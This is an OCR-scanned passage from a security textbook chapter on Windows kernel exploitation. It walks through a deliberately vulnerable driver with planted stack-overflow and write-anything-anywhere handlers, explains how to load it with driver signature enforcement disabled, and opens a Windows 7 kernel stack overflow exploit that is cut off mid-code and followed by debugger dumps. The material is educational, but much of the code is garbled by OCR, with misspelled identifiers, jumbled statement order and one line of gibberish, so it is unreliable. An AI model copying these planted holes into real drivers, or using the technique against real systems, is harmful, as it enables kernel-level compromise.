point will be called and executed first. For a Windows driver, this entry point has a
fixed format (see Fig. 6.50), and the default function name for a general linker is
DriverEntry.
The DriverObject parameter of the DriverEntry function represents the driver
object of the current driver. Since the driver is dependent on the device for Windows
driver development, the target of IRP operations is the device and the actual code
executed by the device is the driver.
Typically, a driver creates one or more device objects that are associated with
driver objects of this driver. See Fig. 6.51 for the structure of a stack of device
objects, and the actual execution of the driver code associated with a device object
when the IRP reaches it.
Therefore, our driver needs to write the following entry function.
#include 
#define
DEBUG
FALSE
PDEVICE_OBTECT DeviceObject = NULL;
UNICODE_STRING Symbo1LinkName = { 0 } ;
---
## Page 537
524
6PWN
NTSTATUS DispatchSucess (PDEVICE_OEJECT DevicePtr, PIRP IrpPtr) {
IrpPtr->IoStatus .Status = STATUS_SUCCESS;
IrpPtr->IoStatus. Information = 0;
IoCompleteRequest (IrpPtr, 0) ;
return STATUS_SUCCESS ;
NTSTATUS DispatchControl (PDEVICE_OBTECT DevicePtr, PIRP IrpPtr)(
UNR&FER&NCED_PARANETER (DeVi cePtx) :
PIO_STACK_LOCATION CurIxpStack;
ULONG ReadLength, WriteLength;
NTSTATUS status = STATUS_UNSUCCESSFUL ;
ReadLength = CurIrpStack->Parameters , Read Length;
CurIrpStack = IoGetCurrentIrpStackLocation (IxpPtx) ;
HriteLength = CurIrpStack->Parameters.Wzite .Length;
/ / Vulnerability code
NTSTATUS D1spatchUnload (PDRIVER_OBJECT Dr1verOb]ect){
UNR&FER&NCED_PARANETER (Dri verObJect) ;
IoDeleteDevice (DeviceObject) ;
IoDeleteSymbo1icLink (&SymbolLinkName) ;
return STATUS_SUCCESS;
NTSTATUS
DrivexEntry (_In_ PDRIVER_OBTECT DriverObject, _In_ PUNICcoDE_STRING
RegistzyPath) (
UNICOD&_STRING DeviceObjName = ( 0 } :
NTSTATUS status = 0 ;
UNR&FER&NCED_PARANETER (Reg1 stryPath) :
if DEBUG
#endif
_debugbreak (1 ;
Rt1InitUnicodeString (&DeviceObjMame, L"\crDevice
\crtarget_device*) ;
status = IoCreateDevice (Driverobject,
0 ,
FILE_DEVICE_UNKNON,
&DeviceObjName,
FALSE,
&DeviceObject) :
---
## Page 538
6.9 Windows Kemel PWN
525
if (INT_SUcCEss (status)) {
DbgPrint ("Create Device Failed’n*) ;
Rt1FreeUnicodeString(&DeviceObjName) :
return STATUS_FAILED_DRIVER_ENTRY ;
DeviceObject ->Flags | = DO_BUFFERED_IO;
Rt1InitUnicodeString (&SymbolLinkName, L"\cr??
\crtarget_symbolic*) :
status = IoCreateSymbo1icLink (&Symbo1LinkName, &DeviceObjName) :
if (INT_SUcCEss (status) ){
DbgPrint ("Create SymbolicLink Fai1ed’,n*) 
Rt1FreeUnicodeString(&Symbo1LinkName) ;
IoDeleteDevice (DeviceObject) ;
Rt1FreeUnicodeString(&DeviceObjName) :
return STATUS_FAILED_DRIVER._ENTRY ;
for (INT 1 = 0; 1 MajoxFunction [1] = DispatchSucess;
DxiverObject - >MajorFunction [IRP_MJ_DEVICg_CONTRoL] =
DispatchControl;
DriverObject ->Drivertmload = (PDRIVER_UNLOAD) DispatchUnload;
return STATUs_SUCCESS ;
First, a device object is created using the IoCreateDevice function to associate
with the current driver object. Then, you need to create a symbolic link via the
IoCreateSymbolicLink function. This symbolic link object is created to expose the
previously created device object to the user state. By default, the device object is
located in the Device directory, while the Win32 API can only access the contents of
the IGLOBAL?? directory. By creating a symbolic link to the Device directory in
\GLOBAL?? symbolic link to the device object in Device, the Win32 API can
access the device.
Then set the DO_BUFFERED_IO flag to the device, which indicates that this
device uses buffered mode to interact with the user-space programs. Windows
provides three ways to interact with the device, which I will not repeat here.
The next step is to set up a distribution function for the driver object, the driver
willreceive IRP request packets with different MajorCode when sending requests to
the device object through different functions. The MajorCode is set by the function
automatically, for example, when using the DeviceloControl function, the driver
receives requests with MajorCode IRP_MJ_DEVICE_CONTROL. When the driver
receives these IRP requests, it automatically calls the corresponding distribution
function. The program only needs to set MajorCode to IRP_MJ_DEVICE_ CON-
TROL of the distribution function, other MajorFunction can be set to retum directly.
---
## Page 539
526
6PWN
In addition, parameters that are not used in the function need to be indicated using
the UNREFERENCED_PARAMETER macro, which is a null macro, since the
driver will treat the waming as an error at compile time and will not be able to
compile without it.
6.9.2.2Writing a Stack Overflow Example
The actual vulnerability code is added to the MajorFunction of
IRP_MJ_DEVICE_CONTROL in the following sections. We first write the sample
code for a stack overflow vulnerability that needs to receive incoming data from the
user state. So, we design the following structure to store the data to be transmitted
and the size of the data.
typedef struct _CONrROL_PACKET {
union {
struct {
INr64 BufferSize;
INr8 Buffex[100] :
}_SOF;
} CONTROL_PACKET, *PCONTROL_PACKET;
} Parameter;
Design another IOCTL code that will be passed in the DeviceloControl function
and finally received in the MajorFunction of IRP_MJ_DEVICE_CONTROL.
#defineCODE_SOF Ox803
#define SOF_CTL_CODE \
(ULONG) CTL_CODE (FILE_DEVICE_UNKNOMN, CODE_SOF, METHOD_BUFFERED,
FILE_READ_DATA|FILE_NRITE_DATA)
The IOCTL code is just an integer value but is divided into 4 fields by meaning.
the CTL_CODE macro is just a shift operation that can be used to define our oOCTL
code. Since our driver doesn’t drive any hardware, we need to specify the
FILE_DEVICE_UNKNOWN type. METHOD_BUFFERED indicates that we will
be interacting with the buffered I/O model, and CODE_SOF is a value we need to
set, as long as it doesn’t conflict with a Windows reserved value, it is fully
customizable.
Also, we add the following code to IRP_MI_DEVICE_CONTROL's
MajorFunction, DispatchControl function.
NTSTATUS DispatchControl (PDEVICE_OBJECT DevicePtr, PIRP IrpPtr) {
UNR&FER&NCED_PARANETER (DeVi cePtx) :
ULONG ReadLength, KriteLength;
PIO_STACK_LOCATION CurIrpStack;
---
## Page 540
6.9 Windows Kermel PWN
527
PCONTROL_PACKET PacketPtr = NULL ;
INr64 BufferSize = 0;
INr8 StackBuffer [0x1o] ;
CurIrpStack = IoGetCurrentIrpStackLocation (IrpPtr) ;
ReadLength = CurIrpStack->Parameters Read . Length;
HxiteLength = CurIrpStack- >Parameters Wzite Length;
// Vulnerability code
Rt1CopyMemory (StackBuffer, PacketPtr->Parameter ._SOF Buffer,
BufferSize = PacketPtr- >Parameter._SOF.BufferSize;
BufferSize) :
IrpPtr->IoStatus .Status = STATUS_SUCCESS;
IrpPtr- >IoStatus . Information = sizeof (CowrROL_PACK&T) :
return STATUS_SUCCESS;
IoCompleteRequest (IrpPtr, 0) ;
This function receives IRP packets passed by the IO manager as parameters. IRP
packets are a multi-layered stack structure, for this purpose, it is necessary to use
IoGetCurrentlpStackLocation to get the current IRP stack. structure. There is a
union called Parameters in the IRP stack, which will be different structures according
to the type of the IRP. Here, since we are using the Buffer I/O patterm, we can get a
pointer to the data through IrpPtr- >AssociatedIrp.SystemBuffer and then implement
an example of stack overflow by declaring a buffer in the stack and calling the
RtlICopyMemory function.
6.9.2.3 Writing Arbitrary Address Write Examples
Similar to stack overflow, we also design a transfer data structure to pass data and
define an IOCTL value.
#define CoDE_WAA
0x8 01
#define WAA_CTL_CODE
(ULONG) CTL_CODE (FILE_DEVICB_UNIGNONN, CODE_WAA , METHOD_BUFFER&D,
FILE_READ_DATA| FILE_MEITS_DATA)
typedef struct _CoWrRoL_PACKET (
union {
struct (
INT64 What ;
INT64 Where;
J_AAW;
---
## Page 541
528
6PWN
} CONTROL_PACKET, *PCONTROL_PACKET;
} Parameter;
Similarly, add vulnerability code to IRP_MI_DEVICE_CONTROL's
MajorFunction, where a write-anything-anywhere example is implemented, without
going into details.
NTSTATUS DispatchControl (PDEVICE_OBJTECT DevicePtr, PIRP IrpPtx)(
UNR&FER&NCED_PARANETER (DeVi cePtx） :
PIO_STACK_LOCATION CurIxpStack ;
ULONG ReadLength, HriteLength;
PCONTROL_PACKET PacketPtr = NULL ;
INr64 WhatValue = 0 ;
INT64 WhereValue = 0 ;
ReadLength = CurIrpStack->Parameters , Read. Length;
CurIrpStack = IoGetCurrentIrpStackLocation (IrpPtr) ;
HriteLength = CurIrpStack->Parameters.Write .Length;
// Vulnerability code
PacketPtr = (PCONTROL_PACKET) IrpPtr- >AssociatedIrp SystemBuffer ;
NhatValue = PacketPtr->Parameter ._AAw.What ;
HhereValue = PacketPtr - >Parameter ._AAW. Where ;
• ((PINT64)HhereValue) = WhatValue ;
IrpPtr->IoStatus .Status = STATUS_SUCCESS;
IoCompleteRequest (IrpPtr, 0) :
IrpPtr- >IoStatus . Information = sizeof (cowrROL_PAcK&T) ;
return STATUS_SUCCESS ;
6.9.2.4 Loading the Kernel Driver
The examples used are all NT drivers, so we will only describe how to load NT
drivers, which are relatively simple to load and are loaded by registering them as
system services, which are managed by a Service Control Manager process named
services.exe, which is also loaded intermally by calling the NtLoadDriver function.
Of course, not every process can load the kermel driver by calling NtLoadDriver, but
there is a privilege called SeLoadDriverPrivilege in the Windows operating system,
which is only available to Tokens with System privileges.
In this section, the driver is also loaded by means of the most formal SCM
registration service.
---
## Page 542
6.9 Windows Kemel PWN
529
hServiceManager = OpenSCManagerA (NULL, NULL, SC_MANAGER_ALL_ACCESS) :
if (NULL == hServiceManager) (
printf ("OpenSCManager Fai1 : $d\,n*, GetLastError ()) ;
retuzn 0;
hDriverService = CreateServiceA (hServiceManager,
ServiceName,
SERVICE_ALL_ACCESS,
Serv1ceName,
SERVICE_DEMAND_START,
SERVICE_KERNEL_DRIVER,
SERVICE_ERROR_IGNORE,
DriverPath,
NULL,
NULL,
NULL,
NULL,
NULL) :
if (NULL == hDriverSezvice) {
if (ErrorCode 1= ERROR_Io_P&NDING && ErrorCide 1=
ErrorCode: = GetLastError () :
ERROR_SERVICE_EXISTS) {
printf (*CreateService Fail: $d\n", ErrorCode) :
ErrorExit (1 ;
else {
printf (*Service is exist\n") ;
hDriverService = OpenServiceA (hServiceManager, ServiceNane,
SERVICE_ALL_ACCESS) :
if (NULL == hDriverService) {
printf *OpenService Fai1: $d’n", GetLastError () ;
return 0;
ErrorCode = StartServiceA (hDriverService, NULL, NULL) ;
if (FALSE == ErrorCode) (
ErrorCode = GetLastError () ;
1f (ErrOrCode 1= ERROR_SRRVICE_ALREADY_RUNNING)(
printf (*StartService Fai1: $d`n", ErrorCode) ;
return 0;
return 0;
---
## Page 543
530
6PWN
Call OpenSCManager to open the SCM, get a handle, and then call CreateService
to create a service with that handle. If the service has already been created, the
CreateService function returns NULL, and the OpenService function needs to be
called to open the existing service. Once you have the service's handle, the next step
is to start the service and its driver is loaded.
Due to the DSE (Driver Signature Enforcement) protection in higher versions of
Windows, we cannot directly load the example driver we wrote ourselves. If you try
to load an unsigned driver, it will return a failure at the start of the service. For this
reason, it is necessary to start the service in a mode that disables DSE. In Windows,
go to the Settings window and select Update & Security  Recovery  Advanced
Startup: select Troubleshooting_ Advanced Options. .Next select “Boot Settings
 7) Disable Driver Signature Enforcement”.
6.9.2.5 Windows 7 Kernel Vulnerability Exploits
We have chosen Windows 7 as the starting point for Windows kermel exploits
because the Windows 7 operating system lacks protection against kermnel exploits.
It can be said that Windows 7 is defenseless against kemel exploits.
The advantages of Windows 7 for kermel exploitation are as follows. First, there is
executable memory in kemel space, and although Windows 7 has introduced DEP
(Data Execution Protection), it has not introduced this vulnerability mitigation into
kernel space. The executable kernel pool memory gives us the imagination to store the
shellcode in the kermel space. Secondly, the Windows 7 kernel does not segregate the
nooxa a ne sasoad gu wm aso o salad gtu m sed oa
level. In other words, we can manually map an executable memory page to user space
in the user state in advance via a function such as VirtualAlloc, and then jump from
sus o u aq smu qm 1 anoxa oed roxuu asn paddeu mo o aoeds au
process context), again providing room for imagination in storing shellcode.
In addition, some Native APls can leak the addresses of kermel modules. These
Native APIs are not intended to be used directly by the user, and they correspond to
some kermel APIs, so some APIs are not designed with the kernel address leakage in
mind.For example, the SystemModulelnformation function of  the
NtQuerySystemlnformation function can obtain the kermel module’s base address
information (see Fig. 6.52).
C++
kernel_entry NrsTArus NtQuerySystemInformation(
SystemInformation,
IN ULONG
SystemInformationLength,
OUT PULONG
Returntength
Fig, 6.52 The structure of NtQuerySystemInformation
---
## Page 544
6.9 Windows Kemel PWN
531
When generating the code for the Windows 7 driver example, note that to set the
target platform for the Visual Studio project, you need to set the Target OS Version
to Windows 7 and the Target Platform to Desktop.
1. kemel stack overflow exploitation
The exploitation of kermel stack overflow is relatively simple, simply overwriting the
return address of the kemel stack. The reader already has a good understanding of
stack overflow, so I will not repeat it here. By disassembling, we analyze the kermel
overflow space to be Ox28 bytes and therefore write the following code.
hDevice = CreateFile (DEVICE_SYMBOLIC_NANE,
GRNERIC_ALL,
0,
0,
FIL&_ATTR.IBUTE_SYSTEM,
if (hDevice == INVALID_HANDL&_VALUE) {
 (0
DHORD ErrorCode = GetLastError () :
printf (*CreateFile = $d\n", ErrorCode) ;
return 0;
Packet . Parameter ._SOF .Buffersize = 0x28 + 0x8;
for (s1ze_t 1 = 0; 1  g
Breakpoint 2 hit
fffff880037b1429 c3
stack_overflowlDispatchcontrol+exb9:
kd> dq rsp
ret
fffff88004af89c8
fffff88004af89d8
fffffa801aec0110 00000000746c6644
fffffa801aec0110 fffffa801aec0228
fffff88o04af89e8
fffffss004af89f8
fffff88o04af8a28 fffffss0e4af8a68
fffff88004af8a08
0000000000000000 fffffa80c0321a50
fffffsso04af8a28
fffff88o*04af8a18
fffff70001080000 00000701ba2bb01
fffffa801af14d80 0000000000000070
fffff88004af8a38
00c0000000000000 fffffa801aec0110
kd>dq0000c000e00d0e00
000000000000cccc0000000060000c00
000000c000ed0010
000000000000000000000_00000000
00000000000d0020
00000000000000000000009000000c00
00000000000d8950
00000000000d0040
00000000000000000000000000000000
00000000000000000000000000000000